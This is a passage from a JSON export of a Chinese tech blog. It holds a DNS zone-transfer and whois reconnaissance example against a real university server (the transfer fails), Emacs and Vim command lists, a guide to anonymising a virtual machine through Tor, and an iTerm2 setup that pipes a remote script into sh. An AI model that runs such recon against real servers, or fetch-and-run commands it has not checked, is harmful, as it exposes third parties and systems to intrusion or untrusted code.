可以看到，各种信息，从A、cname到MX全部暴露无遗。如果不存在该漏洞则会被服务器拒绝查询请求。 12345ivan@Ivan ~ dig @dns4.tju.edu.cn tju.edu.cn axfr; &lt;&lt;&gt;&gt; DiG 9.8.3-P1 &lt;&lt;&gt;&gt; @dns4.tju.edu.cn tju.edu.cn axfr; (1 server found);; global options: +cmd; Transfer failed. whoiswhois查询，不多解释了 12345678910111213141516171819202122ivan@Ivan ~ whois yfgeek.comWhois Server Version 2.0Domain names in the .com and .net domains can now be registeredwith many different competing registrars. Go to http://www.internic.netfor detailed information. Domain Name: YFGEEK.COM Registrar: GODADDY.COM, LLC Sponsoring Registrar IANA ID: 146 Whois Server: whois.godaddy.com Referral URL: http://www.godaddy.com Name Server: F1G1NS1.DNSPOD.NET Name Server: F1G1NS2.DNSPOD.NET Status: clientDeleteProhibited https://icann.org/epp#clientDeleteProhibited Status: clientRenewProhibited https://icann.org/epp#clientRenewProhibited Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited Status: clientUpdateProhibited https://icann.org/epp#clientUpdateProhibited Updated Date: 21-apr-2016 Creation Date: 23-nov-2012 Expiration Date: 23-nov-2017","categories":[],"tags":[{"name":"Hack","slug":"Hack","permalink":"http://www.yfgeek.com/tags/Hack/"}],"keywords":[]},{"title":"Emacs 命令大全","slug":"emacs-da-quan","date":"2016-07-28T18:10:07.000Z","updated":"2016-08-05T13:14:03.000Z","comments":true,"path":"2016/07/29/emacs-da-quan/","link":"","permalink":"http://www.yfgeek.com/2016/07/29/emacs-da-quan/","excerpt":"emacs命令是由GNU组织的创始人Richard Stallman开发的一个功能强大的全屏文本编辑器，它支持多种编程语言，具有很多优良的特性。有众多的系统管理员和软件开发者使用emacs。","text":"emacs命令是由GNU组织的创始人Richard Stallman开发的一个功能强大的全屏文本编辑器，它支持多种编程语言，具有很多优良的特性。有众多的系统管理员和软件开发者使用emacs。 # 语法emacs(选项)(参数) #选项+&lt;行号&gt;：启动emacs编辑器，并将光标移动到制定行号的行； -q：启动emacs编辑器，而不加载初始化文件； -u&lt;用户&gt;：启动emacs编辑器时，加载指定用户的初始化文件； -t&lt;文件&gt;：启动emacs编辑器时，把指定的文件作为中端，不适用标准输入（stdin）与标准输出（stdout）； -f&lt;函数&gt;：执行指定lisp（广泛应用于人工智能领域的编程语言）函数； -l&lt;lisp代码文件&gt;：加载指定的lisp代码文件； -[batch](http://man.linuxde.net/batch \"batch命令\")：以批处理模式运行emacs编辑器。 #参数文件：指定要编辑的文本文件。 #emacs命令操作大全基本命令 C-x C-c : 退出Emacs C-x C-f : 打开一个文件，如果文件不存在，则创建一个文件 C-g : 取消未完成的命令 编辑 C-z (redefined): Undo；原来C-z是挂起Emacs（然后用[fg](http://man.linuxde.net/fg \"fg命令\")命令调出）；C-x u 是默认的命令； 移动一下光标，再C-z就可以redo M-d : 删除光标后的词语 移动光标 C-v : 向前翻页 M-v : 向后翻页 M-r : 将光标移动到屏幕中间那行 C-a : 移到行首 M-a : 移到句首，从行首到句首之间可能有空格 C-e : 移到行尾 M-e : 移到句尾 M-{ : 向上移动一段 M-} : 向下移动一段 C-right : 向前移动一个单词 C-left : 向后移动一个单词 C-up : 向前移动一段 C-down : 向后移动一段 M-&lt; : 移到整个文本开头 M-&gt; : 移到整个文本末尾 C-u 数字 命令 : 执行多次(数字表示次数)该命令；\"M-数字 命令\" 也可以 M-x goto-line : 移动到某一行 C-l : 重绘屏幕，效果就是当前编辑行移动窗口中央 Buffer 相关 C-x k : 关闭当前buffer C-x b : 切换到前一个编辑的buffer C-x C-b : 列出当前所有buffer C-x C-s : 保存当前buffer C-x s : 保存所有未保存的buffer，会提示你是否需要保存 C-x C-[w](http://man.linuxde.net/w \"w命令\") : 文件另存为 拷贝与粘贴 M-space (redefined): 设置mark; C-@ 是默认命令 C-w (redefined) : 剪切一块区域；如果没有设置mark，则是剪切一行 M-w (redefined) : 拷贝一块区域；如果没有设置mark, 则是拷贝一行 C-k : 从当前位置剪切到行尾 C-y : 粘贴 M-y : 用C-y拉回最近被除去的文本后，换成 M-y可以拉回以前被除去的文本。键入多次的M-y可以拉回更早以前被除去的文本。 C-x r k : 执行矩形区域的剪切 C-x r y : 执行矩形区域的粘贴 窗口操作 C-x 0 : 关闭当前窗口 C-x 1 : 将当前窗口最大化 C-x 2 : 垂直分割窗口 C-x 3 : 水平分割窗口 M-o (redefined) : 在窗口之间切换; C-x o 是默认命令 C-x 5 1/2/3/0 : 对frame类似的操作 C-x &lt; : 窗口内容右卷 C-x &gt; : 窗口内容左卷（这两个命令在垂直分割窗口后比较有用） (C-u) C-x ^ : 加高当前窗口，如果有C-u，则每次加高4行 (C-u) C-x } : 加宽当前窗口 (C-u) C-x { : 压窄当前窗口 ESC C-v : 在其它窗口进行卷屏操作 搜索和替换 C-s : 向前搜索（增量式搜索）；连续C-s，跳到下一个搜索到的目标 C-s RET : 普通搜索 C-r : 向前搜索 C-s RET C-w : 按单词查询 M-% : 查询替换，也就是替换前会询问一下 M-x replace-string : 普通替换 Tags M-! etags .c .h : 创建TAGS文件 M-. : 跳到tag所在位置 M-x list-tags : 列出tags 书签 C-x r m : 设置书签bookmark C-x r b : 跳到bookmark处 帮助 C-h ? : 查看帮助信息 C-h f : 查看一个函数 C-h v : 查看一个变量 C-h k : 查看一个键绑定 (C－h c 也是查看键绑定，但是信息较简略) C-h C-f : 查看一个函数的[info](http://man.linuxde.net/info \"info命令\")，非常有用 C-h i : 看Info 其它 C-M-\\ : 对选中区域，按照某种格式(比如C程序)进行格式化 C-x h : 全部选中 M-! : 执行外部shell命令 M-x shell : 模拟shell的buffer M-x term : 模拟terminal, C-c k 关闭terminal C-x C-q : 修改buffer的只读属性","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://www.yfgeek.com/tags/Linux/"}],"keywords":[]},{"title":"Tor安全上网指南","slug":"tor","date":"2016-07-28T08:01:47.000Z","updated":"2016-08-05T13:13:45.000Z","comments":true,"path":"2016/07/28/tor/","link":"","permalink":"http://www.yfgeek.com/2016/07/28/tor/","excerpt":"本文主要介绍了如何将一个虚拟机系统全局使用TOR技术，笔者所用操作系统为OS X EI Capitan 10.11.5，虚拟机系统为VMware Fusion专业版 8.1.1 (3771013)。","text":"本文主要介绍了如何将一个虚拟机系统全局使用TOR技术，笔者所用操作系统为OS X EI Capitan 10.11.5，虚拟机系统为VMware Fusion专业版 8.1.1 (3771013)。声明！ ==本文原创，技术无罪，笔者即将身处海外，本文撰写目的仅为防止美国棱镜计划侵犯本人隐私安全，无其它任何用途。== ==使用TOR技术请在遵守当地法律的前提下使用！本软件在中国大陆地区已被封锁，按照相关法律法规，禁止使用本软件。由于相关政策法律原因，不允许任何形式私自转载，本文只进行对TOR相关技术探讨，不涉及任何违法违规行为，请勿用于非法用途（如渗透服务器、非法扫描网段、不受监控的网络言论、不受监控的非法互联网通讯等），如出现上述等违法行为，请自负法律责任！== 准备条件 1.一个隧道(ssh,shadowsocks,socket5,http,vpn都可以)可以连接到真正的互联网，如果身处海外请无视此条。 2.最新版Vidalia 下载地址（需完整互联网） 3.Vmware Fusion/Vmware workstation/Oracle VirtualBox 4.一个完整版的虚拟机操作系统 笔者环境 操作系统：OS X EI Capitan 10.11.5 虚拟机软件：VMware Fusion专业版 8.1.1 (3771013) 虚拟机操作系统：Windows xp sp2 或 Kali linux 隧道软件：lantern 或 shadowsockets Vidalia部分如果你的网络未进行封锁，请忽略前2步，请跑步进入第3步。1.建立您的隧道网络 笔者以shadowsocks为例，开启shadowsocks配置好信息后，无需做任何操作。shadowsocks的默认对外端口为1080。 2.在Vidalia中设置代理连接 打开Vidalia-设置-网络：我使用代理服务器连接网络 地址：127.0.0.1 端口：1080（用户定义） 类型：SOCKS 5 3.继续设置，转发出外网端口 Vidalia-设置-高级-编辑当前torrc：确认socksport为9050，也可以定义为其他端口。同时添加SocksListenAddress 0.0.0.0:9050到底部保存 笔者配置文件如下，仅供参考，不可复制： 1234567891011# This file was generated by Tor; if you edit it, comments will not be preserved# The old torrc file was renamed to torrc.orig.1 or similar, and Tor will ignore itControlPort 9051DataDirectory /Users/ivan/.torDirReqStatistics 0HashedControlPassword 16:此处隐藏Socks5Proxy 127.0.0.1:1080Log notice stdoutSocksListenAddress 0.0.0.0:9050SocksPort 9050 4.Vidalia启动TOR 稍等片刻，需要建立Tor回路，五分钟后，便会提示你连接成功。随后可以通过使用Chrome的网络代理插件测试，通过ip测试可判断是否成功。如果ip地址每几分钟自动更新一次，且都是不同国家的，则说明TOR回路建立成功。 Vmware部分1.设置Vmware，添加虚拟网卡 进入Vmware的偏好设置-网络，先点小锁，把功能解锁。 然后点+，新建一个网络，警告：请勿勾选NAT。 勾选 将MAC主机连入该网络 同时设置 通过DHCP在该网络提供网络地址： 子网ip：172.16.225.0 子网掩码：255.255.255.0 2.在虚拟机系统的配置中，将网络适配器的上网方式改为vmnet2 虚拟机-设置-网络适配器-vmnet2，请再次确保无其他上网方式以保证绝对安全。 虚拟机部分(Win)1.进入操作系统 建议重新安装操作系统，以保证系统纯净性。 2.寻找宿主机ip 经过笔者的简单测试，宿主机ip为172.16.225.1如果实在找不到，可用啊D工具箱或nmap等工具进行查找。 3.确认系统当前状态下不能上网，甚至局域网也不可通，检查网络连接中的网络适配器，禁用一切，仅保留本地连接 4.安装Proxifier Proxifier是一个全局代理软件，将socket端口流量转发到系统全局，十分好用稳定，值得推荐。 5.配置Proxifer 打开Proxifier-Profile-Proxy Servers，点击Add… 随后保存并设置而为默认 6.测试网络 打开浏览器，对当前ip进行查询，ip会随着时间随机切换，不同国家。 总结为了保证用户隐私的绝对安全，建议做到以下几点： 在虚拟机系统下不要留下任何痕迹： 虚拟机操作系统系统语言设置为英语，地区为美国。 虚拟机下的浏览器建议使用friefox或chrome，安装https everywhere、noscript等插件，在浏览器相关设置中设置禁止追踪等查看隐私行为。 关机前清除系统隐私记录，养成良好习惯。 能设置不保留记录的软件均设置如此。 不要安装使用任何国产软件，尤其是任何国产音乐播放器、任何国产视频播放器，严禁使用360等任何管家、QQ、搜狗输入法、各种国产云盘，否则一定会前功尽弃。 不要使用任何私人账户登录任何网站、任何软件，如有必要，建议现场注册新号码，不要自作聪明使用尘封已久的小号。 将虚拟机操作系统放在Truecrypt等加密软件的虚拟磁盘里，如果是Windows，建议开启Bitlocker，如果是MacOS，建议开启FileVault，同时将系统密码设置为与自己隐私无关的高强度密码。 设置宿主机的BIOS密码，防止设备被盗隐私丢失，同时建议写好一键远程删除虚拟磁盘的sh脚本，以防重要文件泄露。 进入TOR网络后，您将面临更大的网络威胁，因为TOR的网域中深藏全球各地的极客、大黑客、恐怖分子等危险人物，请更加注意保护虚拟机子系统安全以及文件安全。 特别鸣谢 感谢几年前@safe121提供的无私技术帮助","categories":[],"tags":[{"name":"Hack","slug":"Hack","permalink":"http://www.yfgeek.com/tags/Hack/"}],"keywords":[]},{"title":"Vim 命令大全","slug":"vimda-quan","date":"2016-07-28T02:16:13.000Z","updated":"2016-08-05T13:14:15.000Z","comments":true,"path":"2016/07/28/vimda-quan/","link":"","permalink":"http://www.yfgeek.com/2016/07/28/vimda-quan/","excerpt":"","text":"##进入vi的命令 vi filename :打开或新建文件，并将光标置于第一行首 vi +n filename ：打开文件，并将光标置于第n行首 vi + filename ：打开文件，并将光标置于最后一行首 vi +/pattern filename：打开文件，并将光标置于第一个与pattern匹配的串处 vi -r filename ：在上次正用vi编辑时发生系统崩溃，恢复filename vi filename….filename ：打开多个文件，依次进行编辑 移动光标类命令h ：光标左移一个字符 l ：光标右移一个字符 space：光标右移一个字符 Backspace：光标左移一个字符 k或Ctrl+p：光标上移一行 j或Ctrl+n ：光标下移一行 Enter ：光标下移一行 w或W ：光标右移一个字至字首 b或B ：光标左移一个字至字首 e或E ：光标右移一个字至字尾 ) ：光标移至句尾 ( ：光标移至句首 }：光标移至段落开头 {：光标移至段落结尾 nG：光标移至第n行首 n+：光标下移n行 n-：光标上移n行 n$：光标移至第n行尾 H ：光标移至屏幕顶行 M ：光标移至屏幕中间行 L ：光标移至屏幕最后行 0：（注意是数字零）光标移至当前行首 $：光标移至当前行尾 屏幕翻滚类命令Ctrl+u：向文件首翻半屏 Ctrl+d：向文件尾翻半屏 Ctrl+f：向文件尾翻一屏 Ctrl＋b；向文件首翻一屏 nz：将第n行滚至屏幕顶部，不指定n时将当前行滚至屏幕顶部。 插入文本类命令i ：在光标前 I ：在当前行首 a：光标后 A：在当前行尾 o：在当前行之下新开一行 O：在当前行之上新开一行 r：替换当前字符 R：替换当前字符及其后的字符，直至按ESC键 s：从当前光标位置处开始，以输入的文本替代指定数目的字符 S：删除指定数目的行，并以所输入文本代替之 ncw或nCW：修改指定数目的字 nCC：修改指定数目的行 删除命令ndw或ndW：删除光标处开始及其后的n-1个字 do：删至行首 d$：删至行尾 ndd：删除当前行及其后n-1行 x或X：删除一个字符，x删除光标后的，而X删除光标前的 Ctrl+u：删除输入方式下所输入的文本 搜索及替换命令/pattern：从光标开始处向文件尾搜索pattern ?pattern：从光标开始处向文件首搜索pattern n：在同一方向重复上一次搜索命令 N：在反方向上重复上一次搜索命令 ：s/p1/p2/g：将当前行中所有p1均用p2替代 ：n1,n2s/p1/p2/g：将第n1至n2行中所有p1均用p2替代 ：g/p1/s//p2/g：将文件中所有p1均用p2替换 选项设置all：列出所有选项设置情况 term：设置终端类型 ignorance：在搜索中忽略大小写 list：显示制表位(Ctrl+I)和行尾标志（$) number：显示行号 report：显示由面向行的命令修改过的数目 terse：显示简短的警告信息 warn：在转到别的文件时若没保存当前文件则显示NO write信息 nomagic：允许在搜索模式中，使用前面不带“\\”的特殊字符 nowrapscan：禁止vi在搜索到达文件两端时，又从另一端开始 mesg：允许vi显示其他用户用write写到自己终端上的信息 最后行方式命令：n1,n2 co n3：将n1行到n2行之间的内容拷贝到第n3行下 ：n1,n2 m n3：将n1行到n2行之间的内容移至到第n3行下 ：n1,n2 d ：将n1行到n2行之间的内容删除 ：w ：保存当前文件 ：e filename：打开文件filename进行编辑 ：x：保存当前文件并退出 ：q：退出vi ：q!：不保存文件并退出vi ：!command：执行shell命令command ：n1,n2 w!command：将文件中n1行至n2行的内容作为command的输入并执行之，若不指定n1，n2，则表示将整个文件内容作为command的输入 ：r!command：将命令command的输出结果放到当前行 寄存器操作“?nyy：将当前行及其下n行的内容保存到寄存器？中，其中?为一个字母，n为一个数字 “?nyw：将当前行及其下n个字保存到寄存器？中，其中?为一个字母，n为一个数字 “?nyl：将当前行及其下n个字符保存到寄存器？中，其中?为一个字母，n为一个数字 “?p：取出寄存器？中的内容并将其放到光标位置处。这里？可以是一个字母，也可以是一个数字 ndd：将当前行及其下共n行文本删除，并将所删内容放到1号删除寄存器中。","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://www.yfgeek.com/tags/Linux/"}],"keywords":[]},{"title":"iTerm2 美化全过程","slug":"iterm2-mei-hua-quan-guo-cheng","date":"2016-07-28T01:49:20.000Z","updated":"2016-08-05T13:14:29.000Z","comments":true,"path":"2016/07/28/iterm2-mei-hua-quan-guo-cheng/","link":"","permalink":"http://www.yfgeek.com/2016/07/28/iterm2-mei-hua-quan-guo-cheng/","excerpt":"","text":"本文介绍了iTerm2的美化过程，包括安装oh my zsh，powerline，以及对vim的美化。 1.首先下载 iTerm 22.打开iTerm 23.输入下面指令安装oh-my-zshcurl -L https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh | sh 4.接下来安装Powerline在官网有教程，我们只需要执行官网第一条安装指令就行如果你的终端能够正常执行pip指令，那么直接执行下面的指令可以完成安装 pip install powerline-status 如果没有，则先执行安装pip指令 sudo easy_install pip 5.下载、安装库字体库1）将工程下载下来后cd到install.sh文件所在目录2）执行指令安装字体库 执行./install.sh指令安装所有Powerline字体 安装完成后提示所有字体均已下载到/Users/superdanny/Library/Fonts路径下All Powerline fonts installed to /Users/superdanny/Library/Fonts 6. 设置iTerm 2的Regular Font 和 Non-ASCII Font安装完字体库之后，把iTerm 2的设置里的Profile中的Text 选项卡中里的Regular Font和Non-ASCII Font的字体都设置成 Powerline的字体，我这里设置的字体是12pt Meslo LG S DZ Regular for Powerline 7. 配色方案1）安装配色方案进入刚刚下载的工程的solarized/iterm2-colors-solarized 下双击 Solarized Dark.itermcolors 和 Solarized Light.itermcolors 两个文件就可以把配置文件导入到 iTerm2 里 2）配置配色方案通过load presets选择刚刚安装的配色主题即可 8. 使用agnoster主题1）下载agnoster主题到下载的工程里面运行install文件,主题将安装到~/.oh-my-zsh/themes目录下 2）设置该主题进入~/.zshrc打开.zshrc文件，然后将ZSH_THEME后面的字段改为agnoster。ZSH_THEME=&quot;agnoster&quot;（agnoster即为要设置的主题） 9. 增加指令高亮效果——zsh-syntax-highlighting指令高亮效果作用是当用户输入正确命令时指令会绿色高亮，错误时命令红色高亮 1）cd到.zshrc所在目录 2）执行指令将工程克隆到当前目录 git clone git://github.com/zsh-users/zsh-syntax-highlighting.git 3）打开.zshrc文件，在最后添加下面内容 source XXX/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh 保存文件。 注意：xxx代表.zshrc所在目录 4）cd ~/.oh-my-zsh/custom/plugins 5）再次打开.zshrc文件，在最后面添加下面内容plugins=(zsh-syntax-highlighting)保存文件。 启动iTerm 2 默认使用dash改用zsh解决方法：chsh -s /bin/zsh Vim$ cd solarized $ cd vim-colors-solarized/colors $ mkdir -p ~/.vim/colors $ cp solarized.vim ~/.vim/colors/$ vi ~/.vimrc syntax enable set background=dark colorscheme solarized lsMac OS X 是基于 FreeBSD 的，所以一些工具 ls, top 等都是 BSD 那一套，ls 不是 GNU ls，所以即使 Terminal/iTerm2 配置了颜色，但是在 Mac 上敲入 ls 命令也不会显示高亮，可以通过安装 coreutils 来解决（brew install coreutils），不过如果对 ls 颜色不挑剔的话有个简单办法就是在 .bash_profile 里输出 CLICOLOR=1： $ vi ~/.bash_profile export CLICOLOR=1","categories":[],"tags":[{"name":"Mac","slug":"Mac","permalink":"http://www.yfgeek.com/tags/Mac/"}],"keywords":[]}]}